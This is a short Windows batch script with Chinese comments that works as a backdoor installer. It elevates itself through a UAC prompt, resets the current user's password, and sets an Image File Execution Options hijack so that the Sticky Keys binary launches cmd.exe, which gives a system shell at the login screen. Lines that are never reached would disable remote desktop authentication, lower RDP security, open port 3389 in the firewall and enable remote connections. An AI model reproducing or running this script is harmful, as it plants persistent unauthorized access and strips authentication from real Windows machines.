@echo off
%1 %2
ver|find "5.">nul&&goto :Admin
mshta vbscript:createobject("shell.application").shellexecute("%~s0","goto :Admin","","runas",1)(window.close)&goto :eof
:Admin
echo *|net user %username% *
::修改注册表的映像劫持
echo yes|REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
REM echo yes|REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\sethc.exe" 
pause
goto end
::设置远程桌面连接的用户鉴定选项的状态,分为“0”和“1”两种状态,0代表进行远程桌面前不需要用户身份验证
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0
::设置远程桌面连接的安全层，有三个参数：“0”“1”“2”.0就是连接前使用rdp协议进行身份验证，rdp即远程桌面连接，可以简单的理解为关闭验证,1是指在连接前两端协商来进行身份验证,2是使用tls协议来进行
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0
::配置一下防火墙，设置为允许远程桌面连接，命令行运行以下命令：
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
::注册表来设置一下允许远程桌面连接
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\TerminalServer" /v fDenyTSConnections /t REG_DWORD /D 0 /f
:end
